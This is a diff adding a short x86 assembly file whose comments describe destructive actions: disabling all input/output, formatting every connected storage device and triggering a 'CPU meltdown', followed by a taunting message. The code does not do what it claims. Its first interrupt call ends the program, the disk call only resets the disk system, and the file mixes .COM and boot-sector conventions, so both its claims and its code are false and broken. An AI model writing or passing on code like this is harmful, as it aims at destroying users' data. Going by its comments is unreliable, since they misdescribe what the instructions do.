@@ -1,0 +1,29 @@
+; E
+
+ORG 100h
+
+start:
+    ; Disable all system input/output
+    mov ax, 3100h
+    xor bx, bx
+    int 21h
+
+    ; Format all connected storage devices
+    mov ah, 0
+    mov al, 2
+    mov dl, 0
+    int 13h
+
+    ; LOLZ
+    mov ah, 9
+    mov dx, offset message
+    int 21h
+
+    ; Trigger a CPU meltdown
+    xor ax, ax
+    div ax
+
+message db "bruh really", 0
+
+times 510-($-$$) db 0
+dw 0AA55h
